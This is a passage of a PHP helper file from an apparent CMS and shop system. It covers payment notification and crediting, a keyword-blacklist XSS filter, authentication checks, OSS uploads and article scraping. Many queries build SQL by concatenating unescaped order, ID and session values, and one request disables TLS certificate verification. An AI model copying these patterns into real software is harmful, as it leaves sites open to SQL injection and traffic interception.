        $j = ($j + $box[$a]) % 256;
        $tmp = $box[$a];
        $box[$a] = $box[$j];
        $box[$j] = $tmp;
        $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
    }
    if ($operation == 'DECODE') {
        if ((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26) . $keyb), 0, 16)) {
            return substr($result, 26);
        } else {
            return '';
        }
    } else {
        return $keyc . str_replace('=', '', base64_encode($result));
    }
}

function removeDir($dirName)
{
    if (!is_dir($dirName)) {
        return false;
    }
    $handle = @opendir($dirName);
    while (($file = @readdir($handle)) !== false) {
        if ($file != '.' && $file != '..') {
            $dir = $dirName . '/' . $file;
            is_dir($dir) ? removeDir($dir) : @unlink($dir);
        }
    }
    closedir($handle);

    return rmdir($dirName);
}

function notify($no, $type, $id, $genkey, $email, $num, $M_id, $money, $D_domain, $paytype, $no2 = '')
{
    global $conn, $C_n_discount, $C_p_discount, $C_n_discount2, $C_p_discount2, $C_email, $C_fx1, $C_fx2, $C_fx3, $C_fen1, $C_mobile, $C_smssign, $C_dx5, $fmid;
    if ($money < 0 || $num < 1) {
        return false;//订单金额错误或数量错误
    } else {
        $sql = "select * from sl_member where M_id=" . intval($M_id);
        $result = mysqli_query($conn, $sql);
        $row = mysqli_fetch_assoc($result);
        $M_id = $row["M_id"];
        $M_email = $row["M_email"];
        $M_money = $row["M_money"];
        $M_viptime = $row["M_viptime"];
        $M_viplong = $row["M_viplong"];

        if ($M_viplong - (time() - strtotime($M_viptime)) / 86400 * 24 * 60 > 0) {
            $M_vip = 1;
            if ($M_viplong > 30000) {
                $N_discount = $C_n_discount2 / 10;
                $P_discount = $C_p_discount2 / 10;
            } else {
                $N_discount = $C_n_discount / 10;
                $P_discount = $C_p_discount / 10;
            }
        } else {
            $M_vip = 0;
            $N_discount = 1;
            $P_discount = 1;
        }

        $sql = "select * from sl_list where L_no='" . $no . "'";
        $result = mysqli_query($conn, $sql);
        $row = mysqli_fetch_assoc($result);
        if (mysqli_num_rows($result) <= 0) {

            if ($type == "news") {//文章
                $sql2 = "select * from sl_news where N_del=0 and N_id=" . $id;
                $result2 = mysqli_query($conn, $sql2);
                $row2 = mysqli_fetch_assoc($result2);
                if (mysqli_num_rows($result2) > 0) {
                    $N_title = $row2["N_title"];
                    $N_pic = $row2["N_pic"];
                    $N_price = p($row2["N_price"] * $N_discount);
                    $N_price2 = round($row2["N_price2"], 2);
                    $N_mid = $row2["N_mid"];
                    $N_fx = $row2["N_fx"];
                }

                if ($N_price == $money) {
                    if ($paytype == "余额支付") {
                        mysqli_query($conn, "update sl_member set M_money=M_money-$money where M_id=$M_id");
                    } else {
                        mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey) values($M_id,'$no','帐号充值','" . date('Y-m-d H:i:s') . "'," . $money . ",'$genkey')");
                    }

                    mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey,L_no2) values($M_id,'$no','文章付费阅读','" . date('Y-m-d H:i:s') . "',-" . $money . ",'$genkey','$no2')");

                    mysqli_query($conn, "update sl_orders set O_state=1 where O_genkey='$genkey'");
                    if ($N_mid != $M_id) {
                        mysqli_query($conn, "update sl_member set M_fen=M_fen+" . ($money * $C_fen1) . " where M_id=$M_id");
                        mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey,L_type) values($M_id,'$no','文章付费阅读','" . date('Y-m-d H:i:s') . "'," . ($money * $C_fen1) . ",'$genkey',1)");
                    }
                    if ($N_mid > 0) {
                        mysqli_query($conn, "update sl_member set M_money=M_money+" . $money . " where M_id=$N_mid");
                        mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey) values($N_mid,'" . date('YmdHis') . rand(10000000, 99999999) . "','售出文章-" . $N_title . "','" . date('Y-m-d H:i:s') . "',$money,'')");
                    } else {
                        sendmail("有用户通过" . $paytype . "阅读文章", "用户ID：" . $M_id . "<br>文章名称：" . $N_title . "<br>订单金额：" . $money . "元<br>交易单号：" . $no, $C_email);
                        $_SESSION["time2"] = 0;
                        if ($C_dx5 == 1) {
                            sendsms("【" . $C_smssign . "】有用户通过" . $paytype . "阅读文章，用户ID：" . $M_id . "，文章名称：" . $N_title . "，订单金额：" . $money . "元，交易单号：" . $no, $C_mobile);
                        }
                    }
                    if ($fmid > 0 && $N_mid == 0) {//只有主站文章加提成
                        if ($N_price2 - $money > 0) {
                            $N_price2 = $money;
                        }
                        mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey) values($fmid,'$no','售出文章','" . date('Y-m-d H:i:s') . "'," . $money . ",'$genkey')");
                        mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey) values($fmid,'$no','扣除成本','" . date('Y-m-d H:i:s') . "',-" . $N_price2 . ",'$genkey')");
                        mysqli_query($conn, "update sl_member set M_money=M_money+" . ($money - $N_price2) . " where M_id=$fmid");
                    }
                    if ($N_fx == 1) {
                        fx($money, $M_id, $N_mid);
                    }
                    sendmail("查收您的付费阅读文章", "<p>感谢您购买文章《" . $N_title . "》阅读</p><p>阅读链接：" . gethttp() . $D_domain . "/?type=newsinfo&id=" . $id . "&genkey=" . $genkey . "</p><p>订单编号；" . $genkey . "</p>", getrs("select O_address from sl_orders where O_genkey='$genkey'", "O_address"));
                }
            }

            if ($type == "course") {//课程
                $O = getrs("select * from sl_orders where O_genkey='$genkey'");
                if ($O["O_price"] * $O["O_num"] == $money) {
                    if ($paytype == "余额支付") {
                        mysqli_query($conn, "update sl_member set M_money=M_money-$money where M_id=$M_id");
                    } else {
                        mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey) values($M_id,'$no','帐号充值','" . date('Y-m-d H:i:s') . "'," . $money . ",'$genkey')");
                    }
                    mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey,L_no2) values($M_id,'$no','开通在线课程','" . date('Y-m-d H:i:s') . "',-" . $money . ",'$genkey','$no2')");
                    mysqli_query($conn, "update sl_orders set O_state=1 where O_genkey='$genkey'");
                    if ($N_mid != $M_id) {
                        mysqli_query($conn, "update sl_member set M_fen=M_fen+" . ($money * $C_fen1) . " where M_id=$M_id");
                        mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey,L_type) values($M_id,'$no','开通在线课程','" . date('Y-m-d H:i:s') . "'," . ($money * $C_fen1) . ",'$genkey',1)");
                    }
                    sendmail("有用户通过" . $paytype . "购买课程", "用户ID：" . $M_id . "<br>课程名称：" . $O["O_title"] . "<br>订单金额：" . $money . "元<br>交易单号：" . $no, $C_email);
                    if ($C_dx5 == 1) {
                        sendsms("【" . $C_smssign . "】有用户通过" . $paytype . "购买课程，用户ID：" . $M_id . "，课程名称：" . $O["O_title"] . "，订单金额：" . $money . "元，交易单号：" . $no, $C_mobile);
                    }
                }
            }

            if ($type == "product") {//商品
                $sql2 = "select * from sl_product where P_del=0 and P_id=" . $id;
                $result2 = mysqli_query($conn, $sql2);
                $row2 = mysqli_fetch_assoc($result2);
                if (mysqli_num_rows($result2) > 0) {
                    $P_title = $row2["P_title"];
                    $P_pic = $row2["P_pic"];
                    $P_sell = $row2["P_sell"];
                    $P_selltype = $row2["P_selltype"];
                    $P_ggsell = $row2["P_ggsell"];
                    $P_gg = $row2["P_gg"];
                    if ($row2["P_vip"] == 1) {
                        $P_price = p($row2["P_price"] * $P_discount);
                        $P_price2 = round($row2["P_price2"], 2);
                    } else {
                        $P_price = p($row2["P_price"]);
                        $P_price2 = round($row2["P_price2"], 2);
                    }

                    $P_mid = $row2["P_mid"];
                    $P_fx = $row2["P_fx"];
                }

                $O = getrs("select * from sl_orders where O_genkey='$genkey'");
                if (round($O["O_price"] * $num - $O["O_quan"] + $O["O_postage"], 2) == round($money, 2)) {//验证订单金额
                    if ($P_ggsell == "" || $O["O_gg"] == "标配" || $O["O_gg"] == "") {//如果没有设置各项发货
                        switch ($P_selltype) {
                            case 0:
                                $O_content = $P_sell;
                                $O_address = $O["O_address"];
                                $O_state = 1;
                                $O_html = 0;
                                break;
                            case 1:
                                for ($i = 0; $i < $num; $i++) {
                                    $C_id = getrs("select * from sl_card where C_del=0 and C_use=0 and C_sort=" . intval($P_sell), "C_id");
                                    $C_content = getrs("select * from sl_card where C_id=" . intval($C_id), "C_content");
                                    if ($C_content == "") {
                                        $O_content = $O_content . "商品缺货，请联系客服||";
                                    } else {
                                        $O_content = $O_content . $C_content . "||";
                                    }
                                    mysqli_query($conn, "update sl_card set C_use=1 where C_id=" . intval($C_id));
                                }
                                $O_content = substr($O_content, 0, strlen($O_content) - 2);
                                $O_address = $O["O_address"];
                                $O_state = 1;

                                break;
                            case 2:
                                mysqli_query($conn, "update sl_product set P_rest=P_rest-$num where P_id=" . $id);
                                $O_content = "实物商品，由商家手动发货";
                                $O_address = $O["O_address"];
                                $O_state = 2;
                                $O_html = 0;
                                break;
                        }
                    } else {//单项发货
                        $O_gg = splitx($O["O_gg"], "|", 0);
                        $gg = splitx(splitx($P_gg, "@", 0), "_", 1);
                        $gg = explode("|", $gg);
                        for ($z = 0; $z < count($gg); $z++) {
                            if ($O_gg == $gg[$z]) {
                                switch (splitx(splitx($P_ggsell, "\n", $z), "|", 0)) {
                                    case 0:
                                        $O_content = splitx(splitx($P_ggsell, "\n", $z), "|", 1);
                                        $O_address = $O["O_address"];
                                        $O_state = 1;
                                        $O_html = 0;
                                        break;
                                    case 1:
                                        for ($i = 0; $i < $num; $i++) {
                                            $C_id = getrs("select * from sl_card where C_del=0 and C_use=0 and C_sort=" . intval(splitx(splitx($P_ggsell, "\n", $z), "|", 1)), "C_id");
                                            $C_content = getrs("select * from sl_card where C_id=" . intval($C_id), "C_content");
                                            if ($C_content == "") {
                                                $O_content = $O_content . "商品缺货，请联系客服||";
                                            } else {
                                                $O_content = $O_content . $C_content . "||";
                                            }
                                            mysqli_query($conn, "update sl_card set C_use=1 where C_id=" . intval($C_id));
                                        }
                                        $O_content = substr($O_content, 0, strlen($O_content) - 2);
                                        $O_address = $O["O_address"];
                                        $O_state = 1;
                                        break;
                                    case 2:
                                        mysqli_query($conn, "update sl_product set P_rest=P_rest-$num where P_id=" . $id);
                                        $O_content = "实物商品，由商家手动发货";
                                        $O_address = $O["O_address"];
                                        $O_state = 2;
                                        $O_html = 0;
                                        break;
                                }
                            }
                        }
                    }

                    $OX = explode("|", $O["O_title"] . "|" . $O["O_gg"]);
                    for ($i = 0; $i < count($OX); $i++) {
                        if (strpos($OX[$i], "个月") !== false) {
                            $long = intval(splitx($OX[$i], "个月", 0));
                            if ($long > 0) {
                                mysqli_query($conn, "update sl_orders set O_time2='" . date('Y-m-d H:i:s', strtotime('+' . $long . ' month')) . "',O_today='" . date('Y-m-d H:i:s') . "' where O_genkey='$genkey'");
                            }
                        }
                        if (strpos($OX[$i], "年") !== false) {
                            $long = intval(splitx($OX[$i], "年", 0));
                            if ($long > 0) {
                                mysqli_query($conn, "update sl_orders set O_time2='" . date('Y-m-d H:i:s', strtotime('+' . $long . ' year')) . "',O_today='" . date('Y-m-d H:i:s') . "' where O_genkey='$genkey'");
                            }
                        }
                        if (strpos($OX[$i], "天") !== false) {
                            $long = intval(splitx($OX[$i], "天", 0));
                            if ($long > 0) {
                                mysqli_query($conn, "update sl_orders set O_time2='" . date('Y-m-d H:i:s', strtotime('+' . $long . ' day')) . "',O_today='" . date('Y-m-d H:i:s') . "' where O_genkey='$genkey'");
                            }
                        }
                    }

                    mysqli_query($conn, "update sl_product set P_sold=P_sold+$num where P_id=" . $id);
                    if ($paytype == "余额支付") {
                        mysqli_query($conn, "update sl_member set M_money=M_money-$money where M_id=$M_id");
                    } else {
                        mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey) values($M_id,'$no','帐号充值','" . date('Y-m-d H:i:s') . "'," . $money . ",'$genkey')");
                    }
                    if ($P_mid != $M_id) {
                        mysqli_query($conn, "update sl_member set M_fen=M_fen+" . ($money * $C_fen1) . " where M_id=$M_id");
                        mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey,L_type) values($M_id,'$no','购买商品','" . date('Y-m-d H:i:s') . "'," . ($money * $C_fen1) . ",'$genkey',1)");
                    }

                    mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey,L_no2) values($M_id,'$no','购买商品','" . date('Y-m-d H:i:s') . "',-" . $money . ",'$genkey','$no2')");
                    //mysqli_query($conn, "insert into sl_orders(O_pid,O_mid,O_time,O_type,O_price,O_num,O_content,O_title,O_pic,O_address,O_state,O_genkey,O_sellmid) values($id,$M_id,'".date('Y-m-d H:i:s')."',0,$P_price,$num,'$O_content','$P_title','$P_pic','$O_address',$O_state,'$genkey',$P_mid)");
                    //
                    mysqli_query($conn, "update sl_orders set O_state=$O_state,O_content='$O_content' where O_genkey='$genkey'");

                    if ($fmid > 0 && $P_mid == 0) {//只有主站商品加提成
                        if ($P_price2 * $num - $money > 0) {
                            $P_price2 = $money / $num;
                        }
                        mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey) values($fmid,'$no','售出商品','" . date('Y-m-d H:i:s') . "'," . $money . ",'$genkey')");
                        mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey) values($fmid,'$no','扣除成本','" . date('Y-m-d H:i:s') . "',-" . ($money * $P_price2 / $P_price) . ",'$genkey')");
                        mysqli_query($conn, "update sl_member set M_money=M_money+" . ($money - ($money * $P_price2 / $P_price)) . " where M_id=$fmid");
                    }

                    if ($P_mid > 0) {
                        $M = getrs("select * from sl_member where M_id=$P_mid");
                        mysqli_query($conn, "update sl_member set M_money=M_money+" . $money . " where M_id=$P_mid");
                        mysqli_query($conn, "insert into sl_list(L_mid,L_no,L_title,L_time,L_money,L_genkey) values($P_mid,'" . date('YmdHis') . rand(10000000, 99999999) . "','售出商品-" . $P_title . "','" . date('Y-m-d H:i:s') . "',$money,'')");
                        sendmail("有用户通过" . $paytype . "购物", "用户ID：" . $M_id . "<br>商品名称：" . $P_title . "<br>订单金额：" . $money . "元<br>交易单号：" . $no, $M["M_email"]);
                        $_SESSION["time2"] = 0;
                        if ($C_dx5 == 1) {
                            sendsms("【" . $C_smssign . "】您的商品已售出，请登录会员中心查看，单号：" . $no, $M["M_mobile"]);
                        }
                    } else {
                        sendmail("有用户通过" . $paytype . "购物", "用户ID：" . $M_id . "<br>商品名称：" . $P_title . "<br>订单金额：" . $money . "元<br>交易单号：" . $no, $C_email);
                        $_SESSION["time2"] = 0;
                        if ($C_dx5 == 1) {
                            sendsms("【" . $C_smssign . "】有用户通过" . $paytype . "购物，请登录后台查看，交易单号：" . $no, $C_mobile);
                        }
                    }

                    if ($P_fx == 1) {
                        fx($money, $M_id, $P_mid);
                    }

                    if (checkauth()) {
                        plug("x4", "../../conn/plug/");
                        require "../../conn/plug/x4.php";
                    }
                    if (strpos(splitx($O_address, "__", 0), "@") !== false && strpos(splitx($O_address, "__", 0), ".") !== false) {
                        sendmail("您的购买的商品已发货", "<p>商品名称：" . $P_title . "</p><p>取货地址：" . gethttp() . $D_domain . "/member/unlogin.php?type=fahuo&genkey=" . $genkey . "</p><p>订单编号：" . $no . "</p>", splitx($O_address, "__", 0));
                    }
                }
            }
            return true;
        } else {
            return false;
        }
    }
}


function fx($money, $M_id, $P_mid)
{
    global $C_fx1, $C_fx2, $C_fx3, $conn;
    $genkey = date('YmdHis') . rand(1000, 9999);

    if (checkauth()) {
        plug("x2", "../../conn/plug/");
        require "../../conn/plug/x2.php";
    }
}

function fx_vip($money, $M_id, $P_mid)
{
    global $C_fx1, $C_fx2, $C_fx3, $conn;
    $genkey = date('YmdHis') . rand(1000, 9999);

    if (checkauth()) {
        plug("x2", "../conn/plug/");
        require "../conn/plug/x2.php";
    }
}

function removexss($val)
{
    $val = preg_replace('/([\x00-\x08\x0b-\x0c\x0e-\x19])/', '', $val);

    $search = 'abcdefghijklmnopqrstuvwxyz';
    $search .= 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $search .= '1234567890!@#$%^&*()';
    $search .= '~`";:?+/={}[]-_|\'\\';
    for ($i = 0; $i < strlen($search); $i++) {

        $val = preg_replace('/(&#[xX]0{0,8}' . dechex(ord($search [$i])) . ';?)/i', $search [$i], $val);

        $val = preg_replace('/(&#0{0,8}' . ord($search [$i]) . ';?)/', $search [$i], $val);
    }

    $ra1 = array(
        'javascript',
        'vbscript',
        'expression',
        'applet',
        'meta',
        'xml',
        'blink',
        'script',
        'object',
        'iframe',
        'frame',
        'frameset',
        'ilayer',
        'bgsound'
    );
    $ra2 = array(
        'onabort',
        'onactivate',
        'onafterprint',
        'onafterupdate',
        'onbeforeactivate',
        'onbeforecopy',
        'onbeforecut',
        'onbeforedeactivate',
        'onbeforeeditfocus',
        'onbeforepaste',
        'onbeforeprint',
        'onbeforeunload',
        'onbeforeupdate',
        'onbegin',
        'onblur',
        'onbounce',
        'oncellchange',
        'onchange',
        'onclick',
        'oncontextmenu',
        'oncontrolselect',
        'oncopy',
        'oncut',
        'ondataavailable',
        'ondatasetchanged',
        'ondatasetcomplete',
        'ondblclick',
        'ondeactivate',
        'ondrag',
        'ondragend',
        'ondragenter',
        'ondragleave',
        'ondragover',
        'ondragstart',
        'ondrop',
        'onerror',
        'onerrorupdate',
        'onfilterchange',
        'onfinish',
        'onfocus',
        'onfocusin',
        'onfocusout',
        'onhelp',
        'onkeydown',
        'onkeypress',
        'onkeyup',
        'onlayoutcomplete',
        'onload',
        'onlosecapture',
        'onmousedown',
        'onmouseenter',
        'onmouseleave',
        'onmousemove',
        'onmouseout',
        'onmouseover',
        'onmouseup',
        'onmousewheel',
        'onmove',
        'onmoveend',
        'onmovestart',
        'onpaste',
        'onpropertychange',
        'onreadystatechange',
        'onreset',
        'onresize',
        'onresizeend',
        'onresizestart',
        'onrowenter',
        'onrowexit',
        'onrowsdelete',
        'onrowsinserted',
        'onscroll',
        'onselect',
        'onselectionchange',
        'onselectstart',
        'onstart',
        'onstop',
        'onsubmit',
        'ontoggle',
        'onunload'
    );
    $ra = array_merge($ra1, $ra2);

    $found = true;
    while ($found == true) {
        $val_before = $val;
        for ($i = 0; $i < sizeof($ra); $i++) {
            $pattern = '/';
            for ($j = 0; $j < strlen($ra [$i]); $j++) {
                if ($j > 0) {
                    $pattern .= '(';
                    $pattern .= '(&#[xX]0{0,8}([9ab]);)';
                    $pattern .= '|';
                    $pattern .= '|(&#0{0,8}([9|10|13]);)';
                    $pattern .= ')*';
                }
                $pattern .= $ra [$i] [$j];
            }
            $pattern .= '/i';
            $replacement = substr($ra [$i], 0, 2) . ' ' . substr($ra [$i], 2);
            $val = preg_replace($pattern, $replacement, $val);
            if ($val_before == $val) {

                $found = false;
            }
        }
    }
    return $val;
}

function gethttp()
{
    if (is_ssl()) {
        $gethttp = "https://";
    } else {
        $gethttp = "http://";
    }
    return $gethttp;
}


function is_ssl()
{
    global $config;
    if ($config->https == "true") {
        return true;
    } else {
        if (isset($_SERVER['HTTPS']) && ('1' == $_SERVER['HTTPS'] || 'on' == strtolower($_SERVER['HTTPS']))) {
            return true;
        } else {
            if (isset($_SERVER['SERVER_PORT']) && ('443' == $_SERVER['SERVER_PORT'])) {
                return true;
            } else {
                if (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && ('https' == $_SERVER['HTTP_X_FORWARDED_PROTO'])) {
                    return true;
                } else {
                    if (isset($_SERVER['HTTP_FROM_HTTPS']) && ('on' == $_SERVER['HTTP_FROM_HTTPS'])) {
                        return true;
                    } else {
                        return false;
                    }
                }
            }
        }
    }
}

function html($str)
{
    if (checkauth()) {
        plug("x9", "conn/plug/");
        require "conn/plug/x9.php";
        $str = str_replace("index-1.html", "./", $str);
        $str = str_replace("index-0.html", "./", $str);
    } else {
        die("{\"msg\":\"免费版暂不支持伪静态\"}");
    }
    return $str;
}

function admin_auth()
{
    global $conn;
    if ($_SESSION["A_login"] == "" || $_SESSION["A_pwd"] == "") {
        return false;
    } else {
        $sql = "select * from sl_admin where A_login='" . $_SESSION["A_login"] . "' and A_pwd='" . $_SESSION["A_pwd"] . "' and A_del=0";
        $result = mysqli_query($conn, $sql);
        $row = mysqli_fetch_assoc($result);
        if (mysqli_num_rows($result) > 0) {
            return true;
        } else {
            return false;
        }
    }
}

function member_auth($M_id, $M_pwd)
{
    global $conn;
    $sql = "select * from sl_member where M_id=" . $M_id . " and M_pwd='" . $M_pwd . "' and not M_login='未登录帐号' and M_del=0";
    $result = mysqli_query($conn, $sql);
    $row = mysqli_fetch_assoc($result);
    if (mysqli_num_rows($result) > 0) {
        return true;
    } else {
        return false;
    }
}

function app_back($url, $msg)
{
    if ($msg == "") {
        $msg_info = "";
    } else {
        $msg_info = "alert(\"" . $msg . "\");";
    }
    if ($url == "back") {
        $url_info = "uni.navigateBack({delta: 1});";
    } else {
        $url_info = "uni.reLaunch({url: \"" . $url . "\"});";
    }
    return "<script type=\"text/javascript\" src=\"https://js.cdn.aliyun.dcloud.net.cn/dev/uni-app/uni.webview.1.5.2.js\"></script><script>" . $msg_info . "document.addEventListener(\"UniAppJSBridgeReady\", function(){" . $url_info . "});</script>";
}

function fdate($date)
{
//如果是同一天，则显示时+分
//如果是昨天，则显示昨天+时+分
//如果是昨天以前，则显示月+日
//如果是去年，则显示年+月+日

    $timestamp = strtotime($date);

    $y1 = date('y', time());
    $y2 = date('y', strtotime($date));
    $m1 = date('m', time());
    $m2 = date('m', strtotime($date));
    $d1 = date('d', time());
    $d2 = date('d', strtotime($date));

    if (date('Ymd', $timestamp) == date('Ymd')) {
        return date('H:i', $timestamp);
    } else {
        if (date('Ym', $timestamp) == date('Ym') && date('d') - date('d', $timestamp) == 1) {
            return "昨天" . date('H:i', $timestamp);
        } else {
            if (date('Y', $timestamp) == date('Y')) {
                return date('m-d', $timestamp);
            } else {
                return date('Y-m-d', $timestamp);
            }
        }
    }
}

function savepic($str, $dirx)
{
    $str = str_replace("\\\"", "\"", $str);
    $str = str_replace("'", "\"", $str);
    $s = explode("src=\"", $str);
    for ($i = 1; $i < count($s); $i++) {
        $pic = splitx($s[$i], "\"", 0);
        $pic = str_Replace($dirx . "media/img.php?url=", "", $pic);
        if (substr($pic, 0, 7) == "http://" || substr($pic, 0, 8) == "https://" || substr($pic, 0, 2) == "//") {
            $ymd = date("Ymd");
            if (!is_dir("../kindeditor/attached/image/" . $ymd)) {
                @mkdir("../kindeditor/attached/image/" . $ymd, 0777, true);
            }
            $str = str_replace($pic, $dirx . "kindeditor/attached/image/" . $ymd . "/" . downpic("../kindeditor/attached/image/" . $ymd . "/", $pic), $str);
            $str = str_replace($dirx . "media/img.php?url=", "", $str);
        }
    }
    return $str;
}


function editor2oss($str)
{
    $str = str_replace("\\\"", "\"", $str);
    $str = str_replace("'", "\"", $str);
    $s = explode("src=\"", $str);
    for ($i = 1; $i < count($s); $i++) {
        $pic = splitx($s[$i], "\"", 0);
        $pic = str_replace("php/../", "", $pic);
        if (substr($pic, 0, 11) == "/kindeditor") {
            tooss(".." . $pic);
        }
    }
    return $str;
}

function tooss($path)
{
    global $C_osson, $C_oss_id, $C_oss_key, $C_bucket, $C_region, $conn;
    if ($C_osson == 1) {
        $O_md5 = getrs("select * from sl_oss where O_name='" . $path . "'", "O_md5");
        if ($O_md5 != md5(file_get_contents($path))) {
            if ($O_md5 == "") {
                mysqli_query($conn, "insert into sl_oss(O_name,O_md5) values('" . $path . "','" . md5(file_get_contents($path)) . "')");
            } else {
                mysqli_query($conn, "update sl_oss set O_md5=" . md5(file_get_contents($path)) . " where O_name='" . $path . "'");
            }

            $kname = strtolower(substr($path, strrpos($path, '.') + 1));
            switch ($kname) {
                case "bmp":
                    $mime = "image/bmp";
                    break;

                case "png":
                    $mime = "image/png";
                    break;

                case "jpg":
                    $mime = "image/jpg";
                    break;

                case "js":
                    $mime = "application/x-javascript";
                    break;

                case "css":
                    $mime = "text/css";
                    break;

                case "jpeg":
                    $mime = "image/jpeg";
                    break;

                case "gif":
                    $mime = "image/gif";
                    break;

                case "mp4":
                    $mime = "video/mp4";
                    break;

                case "mp3":
                    $mime = "audio/mpeg";
                    break;

                case "wma":
                    $mime = "audio/x-ms-wma";
                    break;

                case "wav":
                    $mime = "audio/x-wav";
                    break;

                default:
                    $mime = "image/jpg";
                    break;
            }
            $url = "http://" . $C_bucket . "." . $C_region;
            $policy = "{\"expiration\": \"2120-01-01T12:00:00.000Z\",\"conditions\":[{\"bucket\": \"" . $C_bucket . "\" },[\"content-length-range\", 0, 104857600]]}";
            $policy = base64_encode($policy);
            $signature = base64_encode(hash_hmac("sha1", $policy, $C_oss_key, true));

            if (class_exists('\CURLFile')) {
                $data = array(
                    'OSSAccessKeyId' => $C_oss_id,
                    'Content-Type' => $mime,
                    'policy' => $policy,
                    'signature' => $signature,
                    'key' => str_replace("../", "", $path),
                    'file' => new \CURLFile($path, $mime, str_replace("../", "", $path)),
                    'type' => $mime,
                    'submit' => 'Upload to OSS'
                );
            } else {
                $data = array(
                    'OSSAccessKeyId' => $C_oss_id,
                    'Content-Type' => $mime,
                    'policy' => $policy,
                    'signature' => $signature,
                    'key' => str_replace("../", "", $path),
                    'file' => '@' . $path . ";type=" . $mime,
                    'submit' => 'Upload to OSS'
                );
            }

            $ch = curl_init();

            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
            $return = curl_exec($ch);
            if ($return === false) {
                var_dump(curl_error($ch));
            }

            $info = curl_getinfo($ch);
            curl_close($ch);

            if ($info["size_download"] == 0) {
                return true;
            } else {
                return false;
            }
        } else {
            return true;
        }
    } else {
        return false;
    }
}

function pic($path)
{
    global $C_osson, $C_bucket, $C_region, $C_oss_domain;
    if (substr($path, 0, 7) == "http://" || substr($path, 0, 8) == "https://" || substr($path, 0, 2) == "//") {
        $P_pic = $path;
    } else {
        if ($C_osson == 1) {
            if ($C_oss_domain == "") {
                $P_pic = "https://" . $C_bucket . "." . $C_region . "/media/" . $path;
            } else {
                $P_pic = $C_oss_domain . "/media/" . $path;
            }
        } else {
            $P_pic = "media/" . $path;
        }
    }
    return $P_pic;
}

function get_article($url)
{
    global $dirx;
    if (strpos($url, "mp.weixin.qq.com") !== false) {//微信公众号
        $info = GetBody2($url, "", "GET");
        $title = splitx($info, "<meta property=\"og:title\" content=\"", 1);
        $title = splitx($title, "\"", 0);

        $img = splitx($info, "<meta property=\"og:image\" content=\"", 1);
        $img = splitx($img, "\"", 0);

        $keyword = "";

        $description = splitx($info, "<meta name=\"description\" content=\"", 1);
        $description = splitx($description, "\"", 0);

        $content = splitx($info, "<div class=\"rich_media_content \" id=\"js_content\" style=\"visibility: hidden;\">", 1);
        $content = splitx($content, "</div>", 0);
        $content = str_replace("data-src=\"", "src=\"" . $dirx . "media/img.php?url=", $content);
    }
    /*
	if(strpos($url,"toutiao.com")!==false){//头条号
		$info=GetBody2($url,"","GET");
		$title=splitx($info,"<title>",1);
		$title=splitx($title,"</title>",0);

		$keyword=splitx($info,"<meta name=keywords content=",1);
		$keyword=splitx($keyword,">",0);

		$description=splitx($info,"<meta name=description content=",1);
		$description=splitx($description,">",0);

		$img=splitx($info,"coverImg: '",1);
		$img=splitx($img,"'",0);

		$content=splitx($info,"content: '",1);
		$content=splitx($content,"'",0);
		$content=html_entity_decode(json_decode(htmlspecialchars_decode($content)));

		$content=str_replace("src=\"","src=\"".$dirx."media/img.php?url=",$content);
	}
	*/
    if (strpos($url, "baijiahao.baidu.com") !== false) {//百家号

        $info = GetBody2($url, "", "GET");

        $title = splitx($info, "<title>", 1);
        $title = splitx($title, "</title>", 0);

        $keyword = splitx($info, "<meta name=\"description\" content=\"", 1);
        $keyword = splitx($keyword, "\"", 0);

        $description = splitx($info, "<meta name=\"description\" content=\"", 1);
        $description = splitx($description, "\"", 0);

        $content = splitx($info, "<div class=\"article-content\">", 1);
        $content = splitx($content, "</div><audio", 0);

        $img = splitx($content, " src=\"", 1);
        $img = splitx($img, "\"", 0);

        $content = str_replace("src=\"", "src=\"" . $dirx . "media/img.php?url=", $content);
    }
    if (strpos($url, "sina.com.cn") !== false) {//新浪新闻
        $info = GetBody2($url, "", "GET");
        $title = splitx($info, "<meta property=\"og:title\" content=\"", 1);
        $title = splitx($title, "\"", 0);

        $keyword = splitx($info, "<meta name=\"description\" content=\"", 1);
        $keyword = splitx($keyword, "\"", 0);

        $description = splitx($info, "<meta name=\"description\" content=\"", 1);
        $description = splitx($description, "\"", 0);

        $img = splitx($info, "<meta property=\"og:image\" content=\"", 1);
        $img = splitx($img, "\"", 0);

        $content = splitx($info, "<!-- 引文 end -->
			<!-- 正文 start -->", 1);
        $content = splitx($content, "<!-- 正文 end -->", 0);
        $content = str_replace("data-src=\"", "src=\"" . $dirx . "media/img.php?url=", $content);
    }

    $arr = array();
    $arr["title"] = $title;
    $arr["img"] = $img;
    $arr["keyword"] = $keyword;
    $arr["description"] = $description;
    $arr["content"] = $content;
    return $arr;
}

function GetBody2($url, $xml, $method = 'POST')
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_TIMEOUT, 300);
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
